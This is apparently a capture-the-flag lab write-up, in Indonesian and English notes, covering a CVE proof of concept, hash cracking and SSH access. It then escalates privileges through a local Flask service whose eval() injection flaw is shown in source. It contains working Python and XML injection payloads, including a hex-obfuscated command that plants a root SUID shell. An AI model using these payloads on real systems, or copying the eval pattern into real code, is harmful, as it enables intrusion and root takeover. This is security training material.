# 1. Initial Access
## a. Port TCP
![](../../../../attachments/Pasted%20image%2020260429054855.png)
## b. Port UDP
filtered
# 2. Enumeration
## a. Web
![](../../../../attachments/Pasted%20image%2020260429043107.png)
### -- CVE
![](../../../../attachments/Pasted%20image%2020260429043255.png)
thisworks
![](../../../../attachments/Pasted%20image%2020260429051306.png)
### -- PoC
![](../../../../attachments/Pasted%20image%2020260429051553.png)
etc/passwd
![](../../../../attachments/Pasted%20image%2020260429051949.png)
db pass
![](../../../../attachments/Pasted%20image%2020260429053914.png)
keystore
![](../../../../attachments/Pasted%20image%2020260429054050.png)
### -- Connect DB
![](../../../../attachments/Pasted%20image%2020260429054652.png)
get password need to decrypt
```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```
![](../../../../attachments/Pasted%20image%2020260429054607.png)
### -- encode base64  
it hex, make it to hash
![](../../../../attachments/Pasted%20image%2020260429061948.png)
detect the hash and decrypt that
![](../../../../attachments/Pasted%20image%2020260429062801.png)
decryp it and it exhausted
![](../../../../attachments/Pasted%20image%2020260429062838.png)

### -- check hash type again, pkdf2WithHmacSHA256
![](../../../../attachments/Pasted%20image%2020260429063954.png)
### -- make it into pkdf2WithHmacSHA256 format
![](../attachments/Pasted%20image%2020260429203546.png)
cracked
![](../attachments/Pasted%20image%2020260429203712.png)
## b. SSH
successfully get shell
![](../attachments/Pasted%20image%2020260429204230.png)

# 3. Privilege Escalation
## a. recon
![](../attachments/Pasted%20image%2020260429204835.png)
## b. use ss as netstat alternative for check what local port is running in machine, port 54321 is interesting
![](../attachments/Pasted%20image%2020260430210945.png)
## c. check running program, there are python script running
![](../attachments/Pasted%20image%2020260430212335.png)
## d. check the notif.py, it run flask and just for local access in port 54321
![](../attachments/Pasted%20image%2020260430212558.png)
```python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```
## e. check request curl, curl is disable, i thing we should make request from python
![](../attachments/Pasted%20image%2020260430213449.png)
## f. based on analyze og notif.py above, we know that
- web on flask run in 127.0.0.1:54321
- it acccept POST request on /addPatient
- the body request is XML, who contain first, last, sender, ts, dob, gender
- the vuln in SSTI dan eval() -> we can get shell from this
- there is filter `pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")` mean python only accept: alphabeth, number, ' " () {} = + / . otherwise it block
## g. we make the payload like this
this xml file
```xml
<patient>
<firstname>{__import__("os").popen("id").read()}</firstname>
<lastname>satria</lastname>
<sender_app>asd</sender_app>
<timestamp>1</timestamp>
<birth_date>01/01/1991</birth_date>
<gender>M</gender>
</patient>
```

this python file
```python
import requests

# 1. Define the XML data as a string
xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<patient>
<firstname>{__import__("os").popen("id").read()}</firstname>
<lastname>satria</lastname>
<sender_app>asd</sender_app>
<timestamp>1</timestamp>
<birth_date>01/01/1991</birth_date>
<gender>M</gender>
</patient>"""

# 2. Set the appropriate headers
headers = {'Content-Type': 'application/xml'}

# 3. Make the POST request
url = 'http://127.0.0.1:54321/addPatient'
response = requests.post(url, data=xml_payload, headers=headers)

# 4. Check the response
print(response.status_code)
print(response.text)

```
## h. successfully get shell
![](../attachments/Pasted%20image%2020260502070421.png)
## i. try get flag, but it say invalid, because flask block space
![](../attachments/Pasted%20image%2020260502070709.png)

## j. coba kita buah shell rootnya
![](../attachments/Pasted%20image%2020260502084919.png)

```python
import requests

xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<patient>
<firstname>{__import__("os").system(bytes.fromhex("696e7374616c6c202d6f20726f6f74202d6d2034373535202f62696e2f62617368202f746d702f2e7368").decode())}</firstname>
<lastname>satria</lastname>
<sender_app>asd</sender_app>
<timestamp>1</timestamp>
<birth_date>01/01/1991</birth_date>
<gender>M</gender>
</patient>"""

headers = {'Content-Type': 'application/xml'}

url = 'http://127.0.0.1:54321/addPatient'
response = requests.post(url, data=xml_payload, headers=headers)

print(response.status_code)
print(response.text)
```

fail to exploit suid
![](../attachments/Pasted%20image%2020260502090447.png)
## k. try using netcat >failed
![](../attachments/Pasted%20image%2020260502091051.png)

## l. try using another suid method > success
![](../attachments/Pasted%20image%2020260502091651.png)